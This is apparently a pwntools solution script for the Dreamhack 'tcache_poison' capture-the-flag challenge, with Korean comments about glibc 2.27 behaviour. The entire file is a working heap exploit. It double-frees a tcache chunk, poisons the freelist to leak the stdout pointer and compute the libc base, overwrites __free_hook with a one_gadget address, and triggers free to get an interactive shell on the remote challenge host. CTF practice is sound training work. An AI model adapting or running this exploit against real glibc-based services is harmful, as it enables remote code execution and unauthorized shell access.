from pwn import *

#p = process("./tcache_poison")
p = remote("host1.dreamhack.games", 9671)
e = ELF("./tcache_poison")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.27.so")
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def allocate(size, content):
    p.sendlineafter("Edit\n", "1")
    p.sendlineafter("Size:", str(size))
    p.sendafter("Content:", content)

def free():
    p.sendlineafter("Edit\n", "2")

def print_chunk():
    p.sendlineafter("Edit\n", "3")

def edit(content):
    p.sendlineafter("Edit\n", "4")
    p.sendafter("chunk:", content)

allocate(0x30, "dreamhack")
free()

edit("A"*8 + "\x00")
free()

addr_stdout = e.symbols["stdout"]
slog("stdout", addr_stdout)
allocate(0x30, p64(addr_stdout))

allocate(0x30, "BBBBBBBB")
allocate(0x30, "\x60")  #2.27에서는 임의 주소로 공간을 할당할 수 있지만 
#그 이후 버전에서는 tcache count가 생겨서 count가 0 이면 더이상 tcache목록에서 청크를 가져오지 않는다.
print_chunk()
p.recvuntil("Content: ")
stdout = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(stdout))
lb = stdout - libc.symbols["_IO_2_1_stdout_"]
fh = lb + libc.symbols["__free_hook"]
og = lb + 0x4f432

slog("free_hook", fh)
slog("one_gadget", og)

#0x30의 크기로 다시 할당을 요청하면, _IO_2_1_stdout_에 청크를 할당받게 되므로 다른 크기의 할당을 요청한다.
allocate(0x40, "dreamhack")
free()
edit("C"*8 + "\x00")
free()

allocate(0x40, p64(fh))
allocate(0x40, "D"*8)
allocate(0x40, p64(og))

# Call `free()` to get shell
free()

p.interactive()